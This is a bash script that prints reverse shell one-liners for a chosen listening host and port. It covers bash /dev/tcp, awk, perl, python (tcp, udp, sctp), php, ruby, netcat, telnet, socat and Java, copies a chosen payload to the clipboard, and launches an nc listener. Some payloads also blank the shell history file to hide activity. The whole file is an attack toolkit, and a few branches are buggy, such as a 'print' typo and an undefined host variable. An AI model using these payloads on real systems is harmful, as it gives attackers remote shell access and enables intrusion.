#!/bin/bash

function check_lhost_check_lport() {
	if [[ -z ${LHOST} ]] || [[ -z ${LPORT} ]] ; then
    	echo "No listening host provided!"
    	echo -e "\t     OR"
    	echo "No listening port provided!"
    	exit 1
    fi
}

function bash() {
	check_lhost_check_lport

	echo ""
	echo "bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1"
	echo ""
	echo "exec /bin/bash 0&0 2>&0"
	echo ""
	echo "0<&196;exec 196<>/dev/tcp/${LHOST}/${LPORT}; sh <&196 >&196 2>&196"
	echo ""
	echo "exec 5<>/dev/tcp/${LHOST}/${LPORT} cat <&5 | while read line; do $line 2>&5 >&5; done"
	echo ""

	if [[ ${SAVE} == "True" ]] ; then
		read -p "Selection [1-4]: " SEL

		if [ -z ${SEL} ] ; then
			echo "No selection made!"
			exit 1

		elif [ ${SEL} -eq 1 ] ; then
			printf "bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1" | xclip -i -selection clipboard

		elif [ ${SEL} -eq 2 ] ; then
			printf "exec /bin/bash 0&0 2>&0" | xclip -i -selection clipboard

		elif [ ${SEL} -eq 3 ] ; then
			printf "0<&196;exec 196<>/dev/tcp/${LHOST}/${LPORT}; sh <&196 >&196 2>&196" | xclip -i -selection clipboard

		elif [ ${SEL} -eq 4 ] ; then
			printf "exec 5<>/dev/tcp/${LHOST}/${LPORT} cat <&5 | while read line; do $line 2>&5 >&5; done" | xclip -i -selection clipboard
		
		elif [ ${SEL} -gt 4 ] ; then
			printf "Selection higher than reverse shells available!"
			exit 1
		fi
	fi
}

function awk() {
	check_lhost_check_lport

	echo ""
	echo "awk 'BEGIN {s = \"/inet/tcp/0/${LHOST}/${LPORT}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
	echo ""

	if [[ ${SAVE} == "True" ]] ; then
		printf "awk 'BEGIN {s = \"/inet/tcp/0/${LHOST}/${LPORT}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}'" /dev/null | xclip -i -selection clipboard
	fi
}

function perl() {
	check_lhost_check_lport

	if [ -z ${OS} ] ; then
		echo ""
		echo "perl -e 'use Socket;$i=\"${LHOST}\";\$p=${LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
		echo ""

		if [[ ${SAVE} == "True" ]] ; then
			printf "perl -e 'use Socket;$i=\"${LHOST}\";\$p=${LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" | xclip -selection clipboard
		fi

	elif [ ${OS} == "linux" ] ; then
		echo ""
		echo "perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"${LHOST}:${LPORT}\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
		echo ""
		echo "perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"${LHOST}:${LPORT}\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
		echo ""

		if [[ ${SAVE} == "True" ]] ; then
			read -p "Selection [1-2]: " SEL

			if [ -z ${SEL} ] ; then
				echo "No selection made!"
				exit 1

			elif [ ${SEL} -eq 1 ] ; then
				printf "perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"${LHOST}:${LPORT}\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'" | xclip -i -selection clipboard

			elif [ ${SEL} -eq 2 ] ; then
				printf "perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"${LHOST}:${LPORT}\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'" | xclip -i -selection clipboard
			
			elif [ ${SEL} -gt 2 ] ; then
				echo "Selection higher than reverse shells available!"
				exit 1
			fi
		fi

	elif [ ${OS} == "windows" ] ; then
		echo ""
		echo "perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"${LHOST}:${LPORT}\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
		echo ""

		if [[ ${SAVE} == "True" ]] ; then
			printf "perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"${LHOST}:${LPORT}\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'" | xclip -i -selection clipboard
		fi
	fi
}

function python() {
	check_lhost_check_lport

	if [ -z ${PROTOCOL} ] ; then
		echo "No protocol selected!"
		echo "Protocol needed!"
		echo -e "\nProtocols:\n\ttcp\n\tudp\n\tstcp\n"

	elif [ ${PROTOCOL} == "tcp" ] ; then
		echo ""
		echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${LHOST}\",${LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
		echo ""

		if [[ ${SAVE} == "True" ]] ; then
			printf "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${LHOST}\",${LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" | xclip -i -selection clipboard
		fi	

	elif [ ${PROTOCOL} == "udp" ] ; then
		echo ""
		echo "python -c 'import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\"${LHOST}\",${LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn([\"/bin/bash\",\"-i\"]);s.close();'"
		echo ""

		if [[ ${SAVE} == "True" ]] ; then
			printf "python -c 'import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\"${LHOST}\",${LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn([\"/bin/bash\",\"-i\"]);s.close();'" | xclip -i -selection clipboard
		fi

	elif [ ${PROTOCOL} == "stcp" ] ; then
		echo ""
		echo "python -c 'import os,pty,socket,sctp;s=sctp.sctpsocket_tcp(socket.AF_INET);s.connect((\"${LHOST}\",${LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn([\"/bin/bash\",\"-i\"]);s.close();exit();'"
		echo ""

		if [[ ${SAVE} == "True" ]] ; then
			printf "\tpython -c 'import os,pty,socket,sctp;s=sctp.sctpsocket_tcp(socket.AF_INET);s.connect((\"${LHOST}\",${LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn([\"/bin/bash\",\"-i\"]);s.close();exit();'" | xclip -i -selection clipboard
		fi
	fi
}

function php() {
	check_lhost_check_lport

	echo ""
	echo "php -r '$sock=fsockopen(\"${LHOST}\",${LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
	echo ""

	if [[ ${SAVE} == "True" ]] ; then
		printf "php -r '$sock=fsockopen(\"${LHOST}\",${LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'" | xclip -i -selection clipboard
	fi
}

function ruby() {
	check_lhost_check_lport

	if [ -z ${OS} ] ; then
		echo ""
		echo "ruby -rsocket -e'f=TCPSocket.open(\"${LHOST}\",${LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
		echo ""

		if [[ ${SAVE} == "True" ]] ; then
			printf "ruby -rsocket -e'f=TCPSocket.open(\"${LHOST}\",${LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" | xclip -i -selection clipboard
		fi

	elif [ ${OS} == "linux" ] ; then
		echo ""
		echo "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"${LHOST}\",\"${LPORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
		echo ""

		if [[ ${SAVE} == "True" ]] ; then
			printf "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"${LHOST}\",\"${LPORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'" | xclip -i -selection clipboard
		fi

	elif [ ${OS} == "windows" ] ; then
		echo ""
		echo "ruby -rsocket -e 'c=TCPSocket.new(\"${LHOST}\",\"${LPORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
		echo ""

		if [[ ${SAVE} == "True" ]] ; then
			printf "ruby -rsocket -e 'c=TCPSocket.new(\"${LHOST}\",\"${LPORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'" | xclip -i -selection clipboard
		fi
	fi
}

function netcat() {
	check_lhost_check_lport

	echo ""
	echo "nc -e /bin/sh ${LHOST} ${LPORT}"
	echo ""
	echo "nc -c /bin/sh ${LHOST} ${LPORT}"
	echo ""
	echo "/bin/sh | nc ${LHOST} ${LPORT}"
	echo ""
	echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${LHOST} ${LPORT} >/tmp/f"
	echo ""

	if [[ ${SAVE} == "True" ]] ; then
		read -p "Selection [1-4]: " SEL

		if [ -z ${SEL} ] ; then
			echo "No selection made!"
			exit 1

		elif [ ${SEL} -eq 1 ] ; then
			printf "nc -e /bin/sh ${LHOST} ${LPORT}" | xclip -i -selection clipboard

		elif [ ${SEL} -eq 2 ] ; then
			printf "nc -c /bin/sh ${LHOST} ${LPORT}" | xclip -i -selection clipboard

		elif [ ${SEL} -eq 3 ] ; then
			printf "/bin/sh | nc ${LHOST} ${LPORT}" | xclip -i -selection clipboard

		elif [ ${SEL} -eq 4 ] ; then
			print "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${LHOST} ${LPORT} >/tmp/f" | xclip -i -selection clipboard

		elif [ ${SEL} -gt 4 ] ; then
			echo "Selection higher than reverse shells available!"
			exit 1
		fi
	fi
}

function telnet() {
	check_lhost_check_lport

	echo ""
	echo "rm -f /tmp/p; mknod /tmp/p p && telnet ${LHOST} ${LPORT} 0/tmp/p"
	echo ""
	echo "telnet ${LHOST} ${LPORT} | /bin/bash | telnet ${HOST} 4445"
	echo ""

	if [[ ${SAVE} == "True" ]] ; then
		read -p "Selection [1-2]: " SEL

		if [ -z ${SEL} ] ; then
			echo "No selection made!"
			exit 1

		elif [ ${SEL} -eq 1 ] ; then
			printf "rm -f /tmp/p; mknod /tmp/p p && telnet ${LHOST} ${LPORT} 0/tmp/p" | xclip -i -selection clipboard

		elif [ ${SEL} -eq 2 ] ; then
			printf "telnet ${LHOST} ${LPORT} | /bin/bash | telnet ${HOST} 4445" | xclip -i -selection clipboard

		elif [ ${SEL} -gt 2 ] || [ ${SEL} -lt 1 ] ; then
			echo "Selection higher than reverse shells available!"
			exit 1
		fi

	fi
}

function socat() {
	check_lhost_check_lport

	echo ""
	echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${LHOST}:${LPORT}"
	echo ""

	if [[ ${SAVE} == "True" ]] ; then
		printf "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${LHOST}:${LPORT}" | xclip -i -selection clipboard
	fi
}

function java()  {
	check_lhost_check_lport

	echo ""
	echo -e "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/${LHOST}/${LPORT};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()"
    echo ""

    if [[ ${SAVE} == "True" ]] ; then
    	printf "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/${LHOST}/${LPORT};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()" | xclip -i -selection clipboard
    fi
}

function listener() {
	if [ -z ${ENV} ] ; then
		echo "Environment needed to spawn correct terminal."
		echo -e "\nSupported Terminals:\n\tgnome\n\txfce\n\tcinnamon\n\tKDE\n"
		exit 1

	elif [ ${ENV} == "gnome" ] ; then
		gnome-terminal -e "nc -lvp ${LPORT}"

	elif [ ${ENV} == "xfce" ] ; then
		xfce4-terminal -e "nc -lvp ${LPORT}"

	else
		echo "Environment ${ENV} not recognized or supported at this time."
		exit 1
	fi
}